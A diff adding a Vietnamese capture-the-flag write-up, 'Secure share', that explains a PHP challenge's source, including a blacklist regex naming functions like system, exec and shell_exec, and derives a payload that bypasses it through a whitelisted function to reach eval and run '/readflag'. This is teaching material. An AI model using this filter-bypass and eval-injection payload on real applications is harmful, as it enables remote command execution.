@@ -856,6 +856,282 @@ Bây giờ login lại vào `username` : `admin` và `password` : `12345678` và
 
 
 
+# Write up: Secure share
+
+# 1.Mục tiêu 
+Challenge này cho một thanh input để nhập URL vào và chuyển sang thành QR Code 
+
+Mục tiêu của bạn là tìm ra cách đọc file flag bằng cách tìm ra lỗ hổng trong mã nguồn được challenge cho 
+
+
+# 2.Giải thích source code
+
+( Mình sẽ giải thích sơ qua vài cái hàm lạ khó hiểu trong này , bạn nào hiểu rồi thì có thể tua xuống dưới nha )
+
+Hàm `preg_match_all` mục đích của nó là tìm kiếm trong cái input mà bạn truyền vào ấy , nó có cái nào khớp với điều kiện do người lập trình đề ra hay không , nếu có thì trả về kết quả vào 1 biến 
+
+Cú pháp của nó là : `preg_match_all (pattern , input , matches)` 
+
+ví dụ với dòng code trong bài : 
+```python
+if (preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(/i', $input, $matches2))
+```
+
+Giả sử bạn nhập vào **input** = `abcd%123(` thì nó sẽ tách ra như thế này 
+
+Phần đầu : `('/([\w]+)` , nó sẽ chỉ quét đến đoạn nào mà vẫn còn chữ hoặc số -> Phần đầu nó sẽ lấy `abcd`
+
+Phần 2 : `([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?` , nó sẽ dò các kí tự rác , thì kí tự rác ở đây nó sẽ lấy bắt đầu từ `%` -> phần 2 sẽ là : `%123` 
+
+Và cái cuối cùng : `\(/i'` : nó sẽ chỉ lấy dấu `(` 
+
+Hàm `trim()` : cắt bỏ các khoảng trắng bị dính ở đầu hoặc ở đuôi chuỗi . giả sử bạn nhập và " abcd " thì sau khi đi qua trim() thì nó sẽ chỉ còn "abcd"
+
+Hàm `function_exists(..)` : hàm có sẵn trong php , nó có chức năng nhận biết tên hàm có sẵn trong php 
+
+Ok bây giờ vào vấn đề chính , giải thích **file** `security_filter.php` trong bài : 
+
+```python
+<?php
+
+// Current security check function
+function security_check($input, $white_fun = [])
+{
+    if (preg_match_all('/([\w]+)([\x00-\x1F\x7F\/\*\<\>\%\w\s\\\\]+)?\(/i', $input, $matches2)) {
+        foreach ($matches2[1] as $value) {
+            if (function_exists(trim($value)) && !in_array($value, $white_fun)) {
+                return false;
+            }
+        }
+    }
+
+    $blacklist_pattern = '/(\([\w\s\.]+\))|(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(require)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)|(strrev)|(substr)|(\)\s*\()|(\.)|(\x5c)|(\bnew\b)|(Reflection)|(invoke)|(#)|(readfile)|(glob)|(scandir)|(var_dump)/i';
+
+    if (preg_match($blacklist_pattern, $input, $matches)) {
+        return false;
+    }
+
+    return true;
+}
+```
+khởi tạo hàm `security_check` nhận 2 tham số là `input` và  mảng `white_fun` , tiếp tục giá trị input được truyền vào trong `preg_match_all` nó sẽ chỉ lấy cái Phần 1 của `input` , tức là cái `input` bạn nhập vào nó sẽ lấy những ký tự toàn chữ số cho đến khi gặp ký tự lạ thì nó ngắt không lấy nữa ( mình đã giải thích phần 1 là gì ở trên ) , mục đích ở đây là lấy tên hàm rồi gán vào `$matches[1]` và đưa đi kiểm tra xem tên hàm đó có tồn tại hay không và tên hàm đó có nằm trong danh sách trắng hay không
+
+Nếu có tồn tại && không nằm trong danh sách cho phép thì sẽ `return false` 
+
+Tiếp theo đi qua cái `blacklist_pattern` , tương tự như trên , nếu quét cái input bạn truyền vào mà phát hiện trùng khớp với blacklist thì sẽ trả về false 
+
+Còn khi mà đã thỏa mãn 2 điều kiền trên thì trả về true 
+
+Tiếp theo qua `index.php` 
+
+```python
+function sys_pref_region()
+{
+    static $cached_region = null;
+    if ($cached_region !== null) {
+        return $cached_region;
+    }
+
+    if (isset($_GET['region'])) {
+        $r = $_GET['region'];
+
+        if (!preg_match('/^[a-z]+$/i', $r)) {
+            $r = 'en';
+        }
+        setcookie('sys_region', $r, time() + (86400 * 365), '/');
+    } elseif (isset($_COOKIE['sys_region'])) {
+        $r = $_COOKIE['sys_region'];
+        if (!preg_match('/^[a-z]+$/i', $r)) {
+            $r = 'en';
+        }
+    } else {
+        $r = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'en';
+        setcookie('sys_region', $r, time() + (86400 * 365), '/');
+    }
+
+    $cached_region = $r;
+    return $r;
+}
+```
+hàm này lấy dữ liệu trực tiếp từ tham số `?region=...` trên url , kiểm tra xem trên url có tham số ?region=... hay không 
+
+- `/^[a-z]+$/i` : để mình giải thích chi tiết đoạn này thì cái `^` và `$` tức là bắt buộc từ đầu đến cuối chuỗi , `[a-z]+` là chỉ chấp nhận các ký tự chữ cái `a` đến `z`  , `+` đó tức là có thể lặp đi lặp lại , và chữ `i` cuối cùng tức là ko phân biệt hoa thường 
+
+- tức là cái mà bạn nhập vào cho tham số `region` ấy , nó phải bắt buộc là chữ cái , không được là số ko được là ký tự đặc biệt ( *hãy để ý đoạn này , chút nữa sẽ rất cần thiết ) 
+
+và rồi cái hàm `sys_pref_region()` nó sẽ return về `$r` và biến r lại được gán với cái đối số bạn truyền vào tham số `region` ở trên ( đoạn code này bạn cứ hiểu nôm na là vậy ) 
+
+```python
+public function parse_qr_tags($content)
+    {
+        global $qr_url, $show_qr;
+
+        $pattern = '/\{sys:qrcode(\s+[^}]+)?\}/';
+
+        if (preg_match_all($pattern, $content, $matches)) {
+            $count = count($matches[0]);
+            for ($i = 0; $i < $count; $i++) {
+                $html = '';
+
+                if ($show_qr && !empty($qr_url)) {
+                    $html = '<img src="?genqr=' . urlencode($qr_url) . '" style="border:1px solid #0f0; padding:5px;">';
+                } else {
+                    $html = '<form method="POST" style="margin: 20px 0;" autocomplete="off">
+                        <input type="text" name="url" placeholder="Enter URL to generate QR code" autocomplete="off"
+                               style="width: 70%; padding: 12px; background: rgba(0, 20, 0, 0.8); 
+                               border: 2px solid #0f0; color: #0f0; font-family: \'Courier New\', monospace; 
+                               font-size: 1em; border-radius: 5px;" required>
+                        <button type="submit" 
+                                style="padding: 12px 25px; background: rgba(0, 255, 0, 0.2); 
+                                border: 2px solid #0f0; color: #0f0; cursor: pointer; 
+                                font-family: \'Courier New\', monospace; font-size: 1em; 
+                                border-radius: 5px; margin-left: 10px; transition: all 0.3s;" 
+                                onmouseover="this.style.background=\'rgba(0, 255, 0, 0.4)\'" 
+                                onmouseout="this.style.background=\'rgba(0, 255, 0, 0.2)\'">
+                            Generate QR
+                        </button>
+                    </form>';
+                }
+
+                $content = str_replace($matches[0][$i], $html, $content);
+            }
+        }
+        return $content;
+    }
+```
+
+tiếp tục là hàm `parse_qr_tags($content)`
+
+nó sẽ nhận cái từ lấy $content rồi đưa qua preg_match_all để lọc , cái đoạn này `$pattern = '/\{sys:qrcode(\s+[^}]+)?\}/';` đây chính là những điều kiện kiểm tra pattern ở bên `parse_qr_tags()` , mình giải thích từng chi tiết một cho các bạn dễ hiểu 
+
+- `{sys:qrcode` : bắt buộc chữ đầu phải là chữ {sys:qrcode
+
+- `(\s+[^}]+)?` : cục này là 1 , bạn có thể hiểu đây như là nội dung chính 
+
+  - `\s+` : ở sau cái chữ `{sys:qrcode` phải là một dấu cách 
+
+  -  `[^}]+` : tức là mọi ký tự như thế nào cũng đều được ngoại trừ dấu } , 
+
+- `\}/` : và phải kết thúc bằng dấu } 
+
+một `$content` hợp lệ sẽ có dạng là `{sys:qrcode abc}` , dạng dạng như thế , rồi khi đi qua cái `preg_match_all` thì sẽ trả về kết quả hợp lệ cho `$matches` và cái `$matches[0]` sẽ lấy nguyên luôn cả cục `{sys:qrcode abc}` , rồi ở đây nếu mà hợp lệ thì nó sẽ tạo 1 qr code ra màn hình cho các bạn 
+
+
+```python
+public function parse_logic_gates($content)
+    {
+        $pattern = '/\{sys:gate\(([^}^\$]+)\)\}([\s\S]*?)\{\/sys:gate\}/';
+
+        if (preg_match_all($pattern, $content, $matches)) {
+            $count = count($matches[0]);
+
+            for ($i = 0; $i < $count; $i++) {
+                $flag = '';
+                $out_html = '';
+
+
+                $white_fun = array('date', 'sys_pref_region');
+
+                $matches[1][$i] = $this->restorePreLabel($matches[1][$i]);
+
+
+                if (!security_check($matches[1][$i], $white_fun)) {
+                    die('Security violation detected!');
+                }
+
+                @eval ('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
+
+                if ($flag == 'if') {
+                    $out_html = $matches[2][$i];
+                }
+                $content = str_replace($matches[0][$i], $out_html, $content);
+            }
+        }
+        return $content;
+    }
+``` 
+
+đây mới chính là hàm cần chú ý , tôi sẽ giải thích chi tiết nhất cho các bạn 
+
+đầu tiên là cái pattern  `$pattern = '/\{sys:gate\(([^}^\$]+)\)\}([\s\S]*?)\{\/sys:gate\}/';`
+
+nếu muốn `$content` có thể khớp với `$pattern` thì : 
+
+- `{sys:gate` : bắt đầu phải bằng `{sys:gate` 
+
+- `\(([^}^\$]+)\)\}` : đây sẽ là `matches[1]` - nơi bạn sẽ đưa payload vào  , nó bắt bạn sau `{sys:gate` phải là dấu `(` ,  và ở sau thì tất cả mọi ký tự đều được trừ `}` , `^` và `$` , ở cuối phải dấu `)` , và `}` 
+
+ví dụ : `{sys:gate(abc)}`
+
+- `([\s\S]*?)` : khúc này là `matches[2]` , nó yêu cầu phải có khoảng trắng ở ở sau `{sys:gate(abc)}` phải là một khoảng trắng rồi điền bất cứ thứ gì ở sau khoảng trắng đó đều được 
+
+ví dụ : `{sys:gate(abc)} 123`
+
+- `\{\/sys:gate\}/` : sau `{sys:gate(abc)} 123` phải là `{/sys:gate}` 
+
+vậy cấu trúc của `$content` cần sẽ là : `{sys:gate(abc)} 123{/sys:gate}` dạng như thế 
+
+để mình nói thêm về cái `matches[0]` và `matches[1]` đấy , giả sử bạn truyền vào `{sys:gate(abc)} 123{/sys:gate}` thì `matches[0]` sẽ lấy nguyên cảm cụm `{sys:gate(abc)} 123{/sys:gate}` còn `matches[1]` sẽ chỉ lấy `abc` và tương tự `matches[2]` nó sẽ lấy `123`
+
+và một điều nữa , giả sử bạn truyền vào 
+```
+{sys:gate(abc)} 123{/sys:gate}
+{sys:gate(bcd)} 345{/sys:gate}
+```
+thì lúc này `{sys:gate(abc)} 123{/sys:gate}` sẽ là `matches[0][0]` và `{sys:gate(bcd)} 345{/sys:gate}` sẽ là `matches[0][1]`
+
+rồi tiếp khởi tạo 1 biến `count` để đếm số `$matches[0]` , cho vòng lặp chạy từ i=0 cho cho đến < `count` , ở đây có mảng `$white_fun` , trong đây là danh sách những hàm được phép đi qua `security_check()` ở đầu bài , nó bao gồm hàm `date` và `sys_pref_region` 
+
+tiếp theo sẽ lấy `$matches[1][$i]` , đưa vào hàm `security_check()` , nếu mà nó đi qua được thì sẽ sử dụng hàm `eval` (*eval() Nó nhận vào một chuỗi văn bản, và ép máy tính phải hiểu đó là lệnh lập trình.) 
+
+# 3.Khai thác 
+
+Ta cùng tư duy từ dưới lên : chỉ có thể khai thác từ cái `eval()` bởi vì đó là nơi duy nhất thực thi nội dung truyền vào 
+
+Tiếp tục , nó lại sử dụng `$matches[1]` , mà `$matches[1]` phải đi qua hàm `security_check()` 
+
+`security_check()` lại chỉ cho 2 hàm đi qua đó chính là `date` và `sys_pref_region() `
+
+chúng ta cùng coi lại hàm `sys_pref_region()` , nó sẽ nhận đối số truyền vào tham số `region` rồi trả về chính cái truyền vào đấy
+
+vậy tức là , nếu mà chúng ta có thể tham số region thì hàm `sys_pref_region()` sẽ in ra chuỗi system 
+
+nhưng mà chưa hết , bởi vì biến $content là nơi chúng ta sẽ truyền payload vào , mà nó phải đi qua preg_match_all với pattern `/\{sys:gate\(([^}^\$]+)\)\}([\s\S]*?)\{\/sys:gate\}/` 
+
+thì như đã phân tích ở trên chúng ta chỉ cần `{sys:gate(payload)} 123{/sys:gate}` cấu trúc dạng như thế là sẽ qua , nhưng cần lưu ý cái `preg_match_all` nó kiểm tra rất gay gắt , nó cho phép mọi kí tự ngoại trừ `}` , `^` , `$` nghĩa là không thể dùng các biến thông thường như là `$_GET` , `$cmd` ,...
+
+vì vậy chúng ta buộc phải làm gián tiếp đó chính là gọi hàm `sys_pref_region()` nó trả về chuỗi `system` nhờ `?region=system` 
+
+vậy tức là payload lúc này sẽ là `{sys:gate(sys_pref_region())} 123{/sys:gate}` thì nó sẽ trả về dạng `{sys:gate(system)} 123{/sys:gate}` 
+
+và vì system đó cũng sẽ là `matches[1]` nên khi ghép vào đoạn eval() đó sẽ là : 
+`@eval ('if(' system '){$flag="if";}else{$flag="else";}');`
+
+bây giờ để biến chuỗi 'system' thành 1 hàm thì chúng ta cần cung cấp thêm cho nó cặp dấu ngoặc và thêm 1 thứ nữa để đọc flag đó chính là đoạn `('/readflag')` nối ngay phía sau 
+
+vì sao lại là '/readflag' chứ không phải là `cat /flag` hay cái gì ? cái này mình cũng không rõ 😅 . nhưng dùng `/readflag` là bởi vì trong file tải về thấy có 1 file là `readflag.c` , file này là 1 file chương trình , nếu viết `system('/readflag')` thì nó sẽ kích hoạt chương trình đó chạy , và bạn không thể viết là `system('/flag.txt')` được vì máy tính sẽ hiểu  lỗi là chạy 1 file văn bản như phần mềm 
+
+vậy tóm lại payload cuối cùng sẽ là 
+`?region=system&a={sys:gate(sys_pref_region()('/readflag'))}123{/sys:gate}`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
